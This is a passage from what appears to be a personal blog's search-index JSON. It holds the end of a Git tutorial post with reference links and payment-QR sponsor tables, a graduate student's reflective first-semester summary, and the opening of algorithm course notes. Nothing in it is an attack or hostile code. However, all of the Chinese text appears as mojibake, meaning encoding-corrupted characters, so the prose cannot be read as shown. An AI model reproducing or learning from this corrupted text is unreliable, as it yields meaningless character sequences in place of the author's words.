[Gitæ•™ç¨‹ - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ (liaoxuefeng.com)](https://www.liaoxuefeng.com/wiki/896043488029600)\n- [git-cheat-sheet (gitee.io)](https://liaoxuefeng.gitee.io/resource.liaoxuefeng.com/git/git-cheat-sheet.pdf)\n- [Git æ•™ç¨‹ | èœé¸Ÿæ•™ç¨‹ (runoob.com)](https://www.runoob.com/git/git-tutorial.html)\n- [Gitä½¿ç”¨æ•™ç¨‹ï¼šæœ€è¯¦ç»†ã€æœ€å‚»ç“œã€æœ€æµ…æ˜¾ã€çœŸæ­£æ‰‹æŠŠæ‰‹æ•™ï¼](https://mp.weixin.qq.com/s?__biz=MzI1NDQ3MjQxNA==&mid=2247487262&idx=2&sn=5c2aa3be4a9422e7b778e245daf5389f&chksm=e9c5f6afdeb27fb9defa48fd7c279662c3a3b72ec787f158af270ec392275bbeb6e070b2f22c&mpshare=1&scene=23&srcid=1017gdrlB3XPLoviLBJD7wA4#rd)\n- [Gitä½¿ç”¨æ•™ç¨‹](https://zhuanlan.zhihu.com/p/263000017)\n- [Gitåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å™¨å¸¸ç”¨å‘½ä»¤å’Œä½¿ç”¨ ](https://www.cnblogs.com/Can-daydayup/p/10134733.html)\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Git"],"categories":["Tools"]},{"title":"ç ”ä¸€ä¸Šæ€»ç»“","url":"/posts/52395.html","content":"\n## ç ”ä¸€ä¸Š\n\n### ç¢ç¢å¿µ\n\nç°åœ¨æ˜¯ 2021å¹´12æœˆ03æ—¥08ç‚¹43åˆ†ï¼Œæ­¤æ—¶æˆ‘æ­£åœ¨æˆéƒ½å¼€å¾€XXçš„ç«è½¦ä¸Šï¼Œå› ä¸ºå¤šè‡­ç¾äº† 10 åˆ†é’Ÿï¼ŒåŠ ä¹‹å»å¾€åœ°é“ç«™çš„è·¯ä¸Šæœ‰ä¸€ç‚¹ç‚¹å µè½¦ï¼Œæˆ‘å·®ç‚¹æ²¡æœ‰èµ¶ä¸Šç«è½¦ï¼Œå¹¸è¿çš„æ˜¯æˆ‘åœ¨åœæ­¢æ£€ç¥¨çš„å‰ä¸€åˆ†é’Ÿé¡ºåˆ©å†²è¿›äº†ç«™ç‚¹ï¼Œæ­¤åˆ»æœ›ç€çª—å¤–è½¬ç¬å³é€çš„é£æ™¯ï¼Œé¡¿æ—¶å¿ƒä¸­æ„Ÿè§¦è‰¯å¤šï¼Œæƒ³ç€ç ”ä¸€ä¸Šå­¦æœŸçš„ç”Ÿæ´»å°±è¦æ¥è¿‘å°¾å£°äº†ï¼Œè¿™çŸ­çŸ­çš„å‡ ä¸ªæœˆç»å†äº†å¾ˆå¤šï¼Œå­¦ä¼šäº†å¾ˆå¤šï¼Œæ˜ç™½äº†å¾ˆå¤šã€‚å…¶å®äº‹å…ˆæ²¡æœ‰æƒ³è¿‡è¦å†™ä¸€ä¸ªæ€»ç»“ï¼Œä½†æ˜¯ä¸€å­¦æœŸå¿«ç»“æŸäº†ï¼Œä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰ç•™ä¸‹ï¼Œå¿ƒé‡Œé¢ç©ºè½è½çš„ï¼Œå®åœ¨æ˜¯ä¸èˆ’æœçš„å¾ˆï¼Œæ‰€ä»¥æƒ³å€Ÿè¿™ä¸ªé™ä¸‹æ¥çš„æ—¶é—´å¥½å¥½å›æƒ³å›æƒ³è‡ªå·±è¿™ä¸€å­¦æœŸåˆ°åº•å¹²äº†äº›ä»€ä¹ˆï¼Œç»™è‡ªå·±æ‰¾ç‚¹å¿ƒé‡Œå®‰æ…°ã€‚\n\næ—¶é—´æ‹¨å›ä»Šå¹´ç››å¤ï¼Œå¯èƒ½è¿™ä¸ªå¤å¤©æ˜¯æˆ‘æœ€æ— å¿§æ— è™‘çš„æ—¥å­äº†å§ï¼Œ é¡ºåˆ©ä¿ç ”ï¼Œæ²¡æœ‰æ‰¾å·¥ä½œçš„å‹åŠ›ï¼Œæ‰‹æœ¯ä¹Ÿè¿˜ç®—æˆåŠŸï¼Œå¯¼å¸ˆä¹Ÿæ²¡æœ‰æå‰è®©æˆ‘å»å¹²æ´»ï¼Œæˆ‘æ¯å¤©åšç€è‡ªå·±å–œæ¬¢çš„äº‹ï¼Œæ—¶è€Œæ†§æ†¬ç€æˆ‘çš„ç ”ç©¶ç”Ÿç”Ÿæ´»ã€‚å°±è¿™æ ·æ†§æ†¬ç€æ†§æ†¬ç€ï¼Œæˆ‘è¸è¿›äº†æˆç”µæ ¡å›­ï¼Œè¿æ¥æˆ‘çš„ä¸æ˜¯ç¾å¥½çš„æ ¡å›­ç”Ÿæ´»ï¼Œç›¸åå„ç§çç¢çš„äº‹çº·è‡³æ²“æ¥ï¼Œæˆ‘ä»¿ä½›åˆå›åˆ°äº†åˆšä»å°é•‡ç¦»å¼€å»åˆ°å¤§å­¦çš„é‚£æ®µæ—¶å…‰ï¼Œä½†åˆå®Œå…¨ä¸åŒï¼Œé‚£æ—¶çš„æˆ‘æ— çŸ¥æ‡µæ‡‚ï¼Œå¯¹ä¸€åˆ‡å……æ»¡å¥½å¥‡ï¼Œæ²¡æœ‰é‚£ä¹ˆå¤šæŠ±æ€¨ï¼Œç°åœ¨çš„æˆ‘å¥½åƒçœŸçš„å˜äº†ï¼Œé‡åˆ°çƒ¦å¿ƒçš„äº‹æ€»æ˜¯å…ˆæŠ±æ€¨ä¸€ç•ªï¼Œä½†è¿™é‡Œçš„ç”Ÿæ´»è·Ÿæˆ‘æƒ³è±¡çš„çœŸçš„ä¸å¤ªä¸€æ ·ã€‚\n\nåˆšå¼€å­¦çš„ä¸€ä¸ªæœˆï¼Œæ•´ä¸ªäººéƒ½å¤„äºå½·å¾¨é˜¶æ®µï¼Œä¹Ÿè®¸å¹¶ä¸åªæ˜¯è¿™ä¸€ä¸ªæœˆæ˜¯å½·å¾¨çš„ï¼Œæˆ–è®¸è¿™ä¸¤å¹´éƒ½æ˜¯å½·å¾¨çš„ã€‚æˆ‘å®³æ€•æ–°ç¯å¢ƒï¼Œæ‰€ä»¥æ•´å¤©è·Ÿå®éªŒå®¤çš„å°ä¼™ä¼´å‘†åœ¨ä¸€èµ·ï¼Œä¸€èµ·ä¸Šè¯¾ï¼Œä¸€èµ·åƒé¥­ï¼Œä¸€èµ·å»å®éªŒå®¤ï¼Œä¸€èµ·ç©è€ã€‚è¿™æ ·çš„æ—¥å­åº”è¯¥åªèƒ½å«åšå¼€å¿ƒå§ï¼Œæ— å¿§æ— è™‘å´ä¸€äº‹æ— æˆã€‚è¿™æ ·çš„å¹³é™éšç€ä¸¤ä¸ªå°ä¼™ä¼´çš„ä¸€æ¬¡å°çŸ›ç›¾è¢«æ‰“ç ´ï¼Œç¾¤é‡ŒèŠå¤©çš„å£°éŸ³å°‘äº†ï¼Œå¤§å®¶å‘†åœ¨ä¸€èµ·çš„æ—¶é—´ä¹Ÿå°‘äº†ï¼Œå¯èƒ½å¹´çºªè¶Šå¤§æˆ‘ä»¬ä¹Ÿæ„ˆåŠ å˜å¾—æ•æ„Ÿäº†ï¼Œå¯èƒ½ä¸€ä¸å°å¿ƒè‡ªå·±çš„æŸä¸ªæ— å¿ƒä¹‹ä¸¾å°±ä¼šä¼¤å®³åˆ°äººï¼Œä½†æˆ‘æ€»æ˜¯åçŸ¥åè§‰çš„ã€‚\n\nçªç„¶å›°æ„æ¥è¢­ï¼Œæˆ‘æƒ³å…ˆç¡ä¸€ä¼š(å°½ç®¡é¢ ç°¸ï¼Œæˆ‘æƒ³æˆ‘ä¾ç„¶ä¼šç¡å¾—å¾ˆé¦™ï¼Œé€ƒç¦»å­¦æ ¡æˆ‘èƒ½å¾—åˆ°çŸ­æš‚çš„æ”¾æ¾)ï¼Œç­‰æˆ‘é†’äº†æˆ‘å†ç»§ç»­å†™å§ã€‚ã€‚ã€‚ç°åœ¨æ˜¯ 12ç‚¹50åˆ† ï¼Œç«è½¦è¿˜åœ¨é£é€Ÿçš„å¾€å‰è¡Œé©¶ã€‚\n\nå›åˆ°å­¦ä¹ å§ï¼Œæˆ‘ä»¥ä¸ºèƒ½åœ¨è¯¾å ‚ä¸Šå­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ï¼Œä½†è€å¸ˆä¼¼ä¹æ›´é€‚åˆç†è®ºç ”ç©¶ï¼Œå¹¶ä¸å¤ªæ“…é•¿è®²è¯¾ï¼Œå¤§éƒ¨åˆ†çš„è¯¾ç¨‹ä¹Ÿéƒ½æ¯”è¾ƒæ°´ï¼Œä½†ä½œä¸šå€’æ˜¯æŒºå¤šçš„ï¼Œæ„Ÿè§‰å¤§éƒ¨åˆ†æ—¶é—´æˆ‘éƒ½åœ¨å†™ä½œä¸šä¸­åº¦è¿‡ï¼Œä»…èƒ½æŠ½å‡ºå°éƒ¨åˆ†æ—¶é—´å­¦æˆ‘æƒ³å­¦çš„ä¸œè¥¿ï¼Œæˆ‘ä¸€åº¦ä¸é€‚åº”è¿™æ ·çš„ç”Ÿæ´»ï¼Œæ•´æ—¥é é¢“åºŸæ¥éº»ç—¹è‡ªå·±ã€‚å› ä¸ºæ€§æ ¼çš„åŸå› ï¼Œå„æ–¹é¢è¡¨ç°çš„å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œç ”ç©¶ç”Ÿç”Ÿæ´»æ›´åŠ é‡è§†è‡ªæˆ‘å±•ç°ï¼Œè¿™æ°å¥½ä¸æ˜¯æˆ‘æ“…é•¿çš„ï¼Œæˆ‘å–œæ¬¢åœ¨è‡ªå·±çš„å°è§’è½é‡Œç”Ÿæ´»ï¼Œæˆ‘ä¸å–œæ¬¢å¤§å®¶å…³æ³¨æˆ‘ï¼Œè®¨è®ºä»€ä¹ˆçš„å¹¶ä¸ç§¯æï¼Œé™¤äº†æ±‡æŠ¥ä»€ä¹ˆçš„éæˆ‘ä¸Šä¸å¯æ—¶æ‰ä¸Šã€‚ç”Ÿæ´»ä¸Šï¼Œè²Œä¼¼ä¹Ÿä¸å¤ªé¡ºå¿ƒï¼Œé£Ÿå ‚ä¸å¥½åƒï¼Œè¿åŠ¨åœºç¦»å®¿èˆå¤ªè¿œï¼Œå®éªŒå®¤ä¹Ÿå¤ªè¿œï¼ŒçœŸæ­£è®©æˆ‘è§‰å¾—ä¸é€‚åº”çš„æ˜¯ï¼Œè¿™é‡Œæ²¡æœ‰ä¸€ç¾¤å¥½æœ‹å‹ï¼Œæˆ‘æ—¶å¸¸ä¸€ä¸ªäººå»é£Ÿå ‚åƒé¥­ï¼Œä¸€ä¸ªäººå»æ‰“çƒã€‚å­¤ç‹¬ï¼Œå¤§æ¦‚æ˜¯æˆ‘ç ”ä¸€ä¸Šæœ€æ·±çš„æ„Ÿè§¦ã€‚ç ”ç©¶ç”Ÿé˜¶æ®µï¼Œå¤§å®¶çš„äº¤é›†å¹¶ä¸å¤šï¼Œéƒ½æ˜¯å„è‡ªå‰è¡Œã€‚æˆ‘ç”¨äº†å¾ˆä¹…ï¼Œé€‚åº”è‡ªå·±ç‹¬å¤„ï¼Œè‡ªå·±åƒé¥­ï¼Œè‡ªå·±å»å›¾ä¹¦é¦†è‡ªä¹ ï¼Œè‡ªå·±ä¸€ä¸ªäººè¿åŠ¨ã€‚ç°åœ¨çš„æˆ‘è¿˜åšä¸åˆ°äº«å—å­¤ç‹¬ï¼Œç­‰æˆ‘çœŸæ­£äº«å—å­¤ç‹¬çš„æ—¶å€™ï¼Œæˆ‘å¯èƒ½æ‰ç®—æ˜¯çœŸæ­£çš„æˆé•¿äº†å§ã€‚\n\nâ€‹\t2021å¹´12æœˆ9æ—¥ï¼Œæ•‘å‘½å•Šï¼Œä»»åŠ¡å¥½å¤šå•Šï¼Œä¸‰ä¸ªå®éªŒé¡¹ç›®ï¼Œä¸€ä¸ªè®ºæ–‡ï¼Œä¸‰å ‚è€ƒè¯•ï¼Œå¯¼å¸ˆè¿˜å«æˆ‘çœ‹è®ºæ–‡ï¼Œæ‰€æœ‰çš„äº‹éƒ½è¦è¿™ä¸¤å‘¨å®Œæˆï¼Œå¥½åƒæ‹¥æœ‰åˆ†èº«çš„è¶…èƒ½åŠ›ğŸ˜­\n\n2021å¹´12æœˆ31æ—¥ï¼Œæ‰€æœ‰çš„äº‹æƒ…éƒ½é¡ºåˆ©å®Œæˆäº†ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰é‚£ä¹ˆéš¾ï¼Œå“ï¼Œæˆ‘è¿™åŒæ—¶å¤„ç†å¤šä»¶äº‹æƒ…å°±çƒ¦èºçš„æ€§å­ä»€ä¹ˆæ—¶å€™èƒ½æ”¹å˜å•Šã€‚\n\nâ€‹\t\tæœªå®Œå¾…ç»­ã€‚ã€‚ã€‚\n\n## ç ”ä¸€ä¸‹\n\nå¾…æ›´æ–°\n\n## è¯»ç ”æ„Ÿæ‚Ÿ\n\nå¦‚ä½•ä¸äººç›¸å¤„æ˜¯æˆ‘æœ€è¿‘ä¸€ç›´åœ¨æ€è€ƒçš„ä¸€ä¸ªé—®é¢˜ã€‚æˆ‘è‡ªè®¤ä¸ºæˆ‘çš„æƒ…å•†è¿˜ç®—å¯ä»¥å§ï¼Œå› ä¸ºæˆ‘å¾ˆèƒ½å–„è§£äººæ„ï¼Œä¼šå»ç…§é¡¾åˆ«äººçš„æƒ…ç»ªï¼Œè€Œä¸”æˆ‘çœŸçš„æ˜¯ç”¨å¿ƒå»ç›¸å¤„ã€‚ä½†å…¶å®ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½ä¼šå¯¹ä½ å‹å–„ï¼Œä¹Ÿå¹¶ä¸æ˜¯æ‰€æœ‰äººéƒ½ä¼šå»è€ƒè™‘ä½ çš„æ„Ÿå—ã€‚ä»¥å‰ï¼Œæˆ‘éå¸¸åœ¨æ„åˆ«äººå¯¹æˆ‘çš„çœ‹æ³•ï¼Œå› æ­¤ï¼Œæˆ‘å¾ˆåŠªåŠ›åœ°è®©åˆ«äººå–œæ¬¢æˆ‘ï¼Œæˆ‘ä¼šè¿å°±åˆ«äººï¼Œæˆ‘ä¼šåŒ…å®¹åˆ«äººï¼Œå“ªæ€•è‡ªå·±æœ‰æ—¶å€™ç‰¹åˆ«å§”å±ˆã€‚è¿™æ ·è®©è‡ªå·±è¿‡çš„å¾ˆéš¾å—ï¼Œè€Œä¸”æˆ‘ä¹Ÿæ²¡æœ‰åŠæ³•åšåˆ°è®©æ‰€æœ‰äººéƒ½å–œæ¬¢æˆ‘ï¼Œæ— è®ºæˆ‘åšä»€ä¹ˆï¼Œæˆ‘ä¹Ÿä¸å¯èƒ½å’Œæ‰€æœ‰äººæˆä¸ºå¥½æœ‹å‹ï¼Œæ—¶é—´å’Œç²¾åŠ›éƒ½ä¸å…è®¸ã€‚æ‰€ä»¥æœ‰çš„äººè§é¢å¯ä»¥å¯’æš„ï¼Œä½†æ˜¯å¯ä»¥ä¸ç”¨ç§ä¸‹ç»å¸¸èŠå¤©ï¼›æœ‰çš„äººå¯ä»¥çº¦ç€ä¸€èµ·åƒé¥­ï¼Œä½†æ˜¯å¯ä»¥ä¸å»å‚ä¸ä»–çš„å…«å¦ã€‚ç°åœ¨æˆ‘çš„æ€åº¦å°±æ˜¯ï¼Œå°½é‡ä¸äººä¸ºå–„ï¼Œå¦ç‡çœŸè¯šï¼Œä¸å»è®®è®ºï¼Œä¸å»åˆ»æ„ã€‚åˆä¸æ¥çš„äººï¼Œå°±æ˜¯åˆä¸æ¥ï¼Œå¹¶ä¸æ˜¯è°çš„é”™ï¼Œä½ æ€»èƒ½æ‰¾åˆ°èƒ½ç†è§£ä½ çš„äººï¼Œèƒ½è·Ÿä½ èµ°åœ¨ä¸€èµ·çš„äººã€‚å…¶å®ï¼Œä¹ŸçœŸçš„æ²¡æœ‰å¿…è¦å»åˆ»æ„è®¨å¥½è°ï¼Œä½ è‡ªå·±çš„è·¯ï¼Œåˆ«äººä¹Ÿå¸®ä¸äº†ä½ å¤ªå¤šã€‚ç›¸æ¯”äºç»“è¯†æ–°çš„æœ‹å‹ï¼Œæˆ‘ä»¬æ›´åº”è¯¥çœ‹åˆ°èº«è¾¹äººï¼Œçæƒœå·²æœ‰çš„æœ‹å‹ã€‚\n\nç ”ç©¶ç”Ÿé˜¶æ®µï¼ŒåŒå­¦æ›´åƒåŒäº‹ï¼Œæ²¡æœ‰å¤šå°‘äººæ˜¯æ¥äº¤æœ‹å‹çš„ã€‚å¤§å®¶æ›´åƒæ˜¯å½¼æ­¤æˆé•¿é“è·¯ä¸Šäº’ç›¸ç«èµ›çš„ç«äº‰è€…ã€‚å…¶å®è½¬æ¢ä¸ºè¿™ç§å¿ƒæ€ï¼Œå°±ä¼šå¥½å¾ˆå¤šäº†ã€‚éƒ½è¯´å¤§å­¦å°±æ˜¯ä¸€ä¸ªå°ç¤¾ä¼šï¼Œç ”ç©¶ç”Ÿé˜¶æ®µæ›´æ˜¯å¦‚æ­¤ï¼Œå¤§å®¶å¯¹äºæœªæ¥çš„å‡†å¤‡ä¼šæ›´åŠ ç§¯æã€è¿«åˆ‡ï¼Œä¼šèŠ±æ›´å°‘çš„æ—¶é—´ç»è¥å‹è°Šï¼Œæ›´å¤šçš„æ—¶é—´æå‡è‡ªå·±ã€‚æ¯ä¸ªäººéƒ½æ˜¯æœ€å…³å¿ƒè‡ªå·±çš„ã€‚ä¹Ÿè®¸æˆ‘ä»¬ä¸èƒ½æˆä¸ºæœ‹å‹ï¼Œä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥æˆä¸ºäº’ç›¸å°Šæ•¬çš„ç«äº‰å¯¹æ‰‹ã€‚\n\nå¦å¤–ä¸€ä¸ªå¾ˆé‡è¦çš„æ˜¯å¼€å¿ƒå•¦ï¼Œåšäººå˜›ï¼Œæœ€é‡è¦çš„å°±æ˜¯å¼€å¿ƒå•°ï¼Œæˆ‘ä»¬ä¸è¦ä¸ºäº†ä¸€äº›é¸¡æ¯›è’œçš®çš„å°äº‹è€Œä¸å¼€å¿ƒï¼Œç³Ÿå¿ƒçš„äº‹ä¸åº”è¯¥å æ®æˆ‘ä»¬ç”Ÿæ´»çš„ä¸»è¦éƒ¨åˆ†ï¼Œå¸Œæœ›è‡ªå·±å¿«ä¹çš„åŒæ—¶ï¼Œä¹Ÿèƒ½å¸¦ç»™èº«è¾¹äººå¿«ä¹ï¼Œä¸è¦åå•¬è‡ªå·±çš„èµç¾ï¼Œå¤šå¤¸å¤¸åˆ«äººï¼Œæ¯”è‡ªå·±å‰å®³è¦è™šå¿ƒå­¦ä¹ ï¼Œå¯¹äºæ¯”è‡ªå·±å¼±çš„ä¹Ÿä¸è¦ç§ä¸èµ·åˆ«äººï¼Œåœ¨æŸä¸ªæ–¹é¢çœ‹èµ·æ¥ä¸å¦‚ä½ ï¼Œåœ¨å…¶ä»–æ–¹é¢ä¹Ÿä¸€å®šæœ‰ä¼˜äºä½ çš„åœ°æ–¹ï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„ä¼˜ç¼ºç‚¹ï¼Œå‘è‡ªå†…å¿ƒçš„å°Šé‡ä»–äººï¼Œä»–äººä¹Ÿä¼šå°Šé‡ä½ ã€‚ä¸è¦å‚»ä¹ä¹çš„åªä¼šå­¦ä¹ å•Šï¼Œå¶å°”çš„å¨±ä¹ä¼šè®©è‡ªå·±çš„å­¦ä¹ æ•ˆç‡æ›´é«˜ï¼Œäººä¹Ÿä¼šæ›´å¼€å¿ƒã€‚\n\n## æœªæ¥è®¡åˆ’\n\n- å°‘ç©æ‰‹æœºï¼Œå¤šé”»ç‚¼ï¼Œå¤šè¯»ä¹¦\n- å­¦ä¹  Java ç›¸å…³çš„çŸ¥è¯†\n- åšæŒå†™æ€»ç»“\n\næœªå®Œå¾…ç»­ã€‚ã€‚ã€‚æš‚æ—¶æƒ³åˆ°çš„å°±è¿™ä¹ˆå¤šï¼Œä¸å®šæœŸæ›´æ–°å§ï¼\n\n### **ğŸ’“Sponsor**\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ€»ç»“"],"categories":["Share"]},{"title":"é«˜çº§ç®—æ³•è®¾è®¡ä¸åˆ†æ","url":"/posts/46989.html","content":"\n## â“ªå‰è¨€\n\næœ¬ç§‘çš„æ—¶å€™ä¸Šè¿‡ã€Šæ•°æ®ç»“æ„ä¸ç®—æ³•ã€‹è¯¾ï¼Œä½†å½¼æ—¶å¤©çœŸçš„ä»¥ä¸ºæå®‰å…¨ä¸éœ€è¦æ‡‚å¤ªå¤šç®—æ³•ï¼Œç®—æ³•éƒ¨åˆ†ä¹Ÿå°±æ²¡æœ‰æ·±å…¥å»å­¦ä¹ ï¼Œæ²¡æƒ³åˆ°è¯»ç ”è¿˜æ˜¯æ²¡èƒ½é€ƒè¿‡ï¼Œæ­¤æ—¶ä¹Ÿå·²ç»æ„è¯†åˆ°ç®—æ³•çš„é‡è¦æ€§ï¼Œåˆå­¦ç®—æ³•æ—¶çœŸçš„è§‰å¾—è¿™ä¸œè¥¿æ™¦æ¶©éš¾æ‡‚ï¼Œè²Œä¼¼æ¯«æ— ç”¨å¤„ï¼Œä½†æ¸æ¸æ˜ç™½ææ‡‚ç®—æ³•èƒŒåçš„æ ¸å¿ƒæ€æƒ³èƒ½è®©ä½ å†™å‡ºæ›´åŠ ä¼˜é›…çš„ä»£ç ã€‚ä½œæ­¤æ–‡çš„ç›®çš„æœ‰å››ï¼Œä¸€æ¥æ˜¯å¤ä¹ æœ¬ç§‘é˜¶æ®µå­¦äº†ä½†åˆé—å¿˜çš„çŸ¥è¯†ï¼›äºŒæ¥æ„Ÿåˆ°è¿‘æ—¥è®°å¿†åŠ›ä¸‹é™æ˜æ˜¾ï¼Œå­¦è¿‡çš„ä¸œè¥¿ä¸ä¸€ä¼šå°±å¿˜äº†ï¼Œè®°ä¸‹æ¥ä»¥ä¾¿æ—¥åå¤ä¹ å§ï¼Œå†è€…å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼›ä¸‰æ¥æ˜¯ä»¥æ­¤åšä¸º UESTC ç ”ä¸€ã€Šé«˜çº§ç®—æ³•è®¾è®¡ä¸åˆ†æã€‹è¯¾ç¨‹çš„æœŸæœ«å¤ä¹ ç¬”è®°ï¼›å››æ¥æ˜¯å¸Œæœ›èƒ½ç»™æ­¤æ—¶æ­£åœ¨çœ‹æ­¤æ–‡çš„ä½ ä¸€ç‚¹ç‚¹å¸®åŠ©å§ã€‚å°ç®€çš„æ°´å¹³å’Œç²¾åŠ›æœ‰é™ï¼Œæ–‡ç« ä¸­éš¾å…å­˜åœ¨ä¸€äº›é”™è¯¯å’Œä¸è¶³ï¼Œæ³è¯·è¯»è€…æ‰¹è¯„æŒ‡æ­£ï¼Œå¦‚å‘ç°é”™è¯¯ï¼Œè¯·åŠæ—¶ä¸ç®€ç®€è”ç³»è¿›è¡Œæ›´æ­£ï¼Œæˆ‘ä»¬å…±åŒä½¿æ–‡ç« æ›´åŠ å®Œå–„ï¼Œå¤§å®¶å¯ä»¥åœ¨è¯„è®ºåŒºç•™ä¸‹è‡ªå·±æƒ³æ³•ï¼Œä¸€èµ·äº¤æµï¼Œè°¢è°¢ğŸ™\n\n`è¯¾ä»¶ä¸‹è½½ï¼š`https://jwt1399.lanzouo.com/b01cy151a å¯†ç :1399\n\n## â‘ ç®—æ³•å¼•è®º\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£ä»€ä¹ˆæ˜¯ç®—æ³•ï¼Œç®—æ³•çš„ç‰¹å¾ï¼Œç®—æ³•å’Œç¨‹åºçš„å·®åˆ«ï¼›\n> - ç†è§£ä»€ä¹ˆæ˜¯åˆ¤æ–­é—®é¢˜å’Œä¼˜åŒ–é—®é¢˜ã€‚\n\n### â¶ä»€ä¹ˆæ˜¯ç®—æ³•\n\n- **ç®—æ³•**æ˜¯æ±‚è§£é—®é¢˜çš„ä¸€ç³»åˆ—è®¡ç®—æ­¥éª¤ï¼Œç”¨æ¥å°†è¾“å…¥æ•°æ®è½¬æ¢æˆè¾“å‡ºç»“æœ    `ä»è›®åŠ›åˆ°ç­–ç•¥`\n- **æ•°æ®ç»“æ„**æ˜¯æ•°æ®çš„ç»„ç»‡ä¸å­˜å‚¨ï¼š`ä»æ‚ä¹±æ— ç« åˆ°äº•ç„¶æœ‰åº`\n- **ç®—æ³• + æ•°æ®ç»“æ„ = ç¨‹åº**\n\n### â·ç®—æ³•çš„ç‰¹å¾\n\n- è¾“å…¥æ€§ï¼šå¿…é¡»æœ‰0ä¸ªæˆ–å¤šä¸ªè¾“å…¥ï¼ˆå¾…å¤„ç†ä¿¡æ¯ï¼‰ \n\n- è¾“å‡ºæ€§ï¼šåº”æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡ºï¼ˆå·²å¤„ç†ä¿¡æ¯ï¼‰ \n\n- ç¡®å®šæ€§ï¼šç»„æˆç®—æ³•çš„æ¯æ¡æŒ‡ä»¤æ˜¯æ¸…æ™°çš„ã€æ— æ­§ä¹‰\n\n- æœ‰ç©·æ€§ï¼šç®—æ³•å¿…é¡»æ€»èƒ½åœ¨æ‰§è¡Œæœ‰é™æ­¥ä¹‹åç»ˆæ­¢\n\n### â¸ä»€ä¹ˆæ˜¯å¥½ç®—æ³•\n\n- æ­£ç¡®æ€§ï¼šç¬¦åˆè¯­æ³•ã€ç¼–è¯‘é€šè¿‡ï¼›\n\n- å¥å£®æ€§ï¼šèƒ½è¾¨åˆ«ä¸åˆæ³•çš„è¾“å…¥å¹¶åšé€‚å½“çš„å¤„ç†ï¼Œä¸è‡³äºå¼‚å¸¸é€€å‡ºï¼ˆå´©æºƒï¼‰ \n\n- å¯è¯»æ€§ï¼šç»“æ„åŒ– + å‡†ç¡®çš„å‘½å + æ³¨é‡Š \n- æ•ˆç‡æ€§ï¼šé€Ÿåº¦å°½å¯èƒ½å¿«ï¼›å­˜å‚¨ç©ºé—´å°½å¯èƒ½å°‘\n\n### â¹ç®—æ³•å’Œç¨‹åºçš„å·®åˆ«\n\n- ç¨‹åºæ˜¯ç®—æ³•ç”¨æŸç§ç¨‹åºè¯­è¨€çš„ä¸€ä¸ªå…·ä½“å®ç°\n- ç¨‹åºæ˜¯ç”¨æ¥ç»™è®¡ç®—æœºè¯»çš„ï¼Œç®—æ³•æ˜¯ç»™äººæ¥è¯»çš„\n- ç¨‹åºå¯ä»¥ä¸æ»¡è¶³ç®—æ³•çš„æœ‰ç©·æ€§ã€‚\n\n### âºåˆ¤æ–­é—®é¢˜å’Œä¼˜åŒ–é—®é¢˜\n\n- **åˆ¤æ–­é—®é¢˜**ï¼šæ˜¯å¦å­˜åœ¨ä¸€ä¸ª...(å¦‚å°äºkçš„ç‚¹è¦†ç›–)\n- **ä¼˜åŒ–é—®é¢˜**ï¼šæ‰¾å‡ºæœ€å¤§/æœ€å°çš„...(æœ€å°ç‚¹è¦†ç›–)\n\nå¾ˆå¤šç»å…¸çš„éš¾é—®é¢˜éƒ½æ˜¯ä¼˜åŒ–é—®é¢˜ï¼Œè€Œä¸€ä¸ªä¼˜åŒ–é—®é¢˜å¾€å¾€å¯ä»¥è½¬æ¢æˆå¯¹åº”çš„åˆ¤æ–­é—®é¢˜ã€‚\n\n### â»ç»å…¸ç®—æ³•åˆ†æ\n\nè´ªå¿ƒç®—æ³•ï¼šé€æ­¥å»ºç«‹ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œå…·ä½“åœ°ä¼˜åŒ–ä¸€äº›å±€éƒ¨å‡†åˆ™ã€‚ 